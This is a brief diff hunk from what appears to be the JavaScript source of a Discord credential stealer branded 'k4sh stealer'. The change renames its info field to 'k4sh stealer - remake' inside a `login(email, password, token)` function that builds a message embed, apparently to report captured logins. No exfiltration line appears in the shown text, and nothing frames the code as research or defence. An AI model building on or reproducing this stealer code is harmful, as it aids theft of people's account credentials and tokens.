@@ -661,7 +661,7 @@ const login = async (email, password, token) => {
         fields: [
           {
             name: '<:Info:987542721596108870> Info',
-            value: `\`\`\`k4sh stealer\`\`\``,
+            value: `\`\`\`k4sh stealer - remake\`\`\``,
             inline: false,
           },
           {
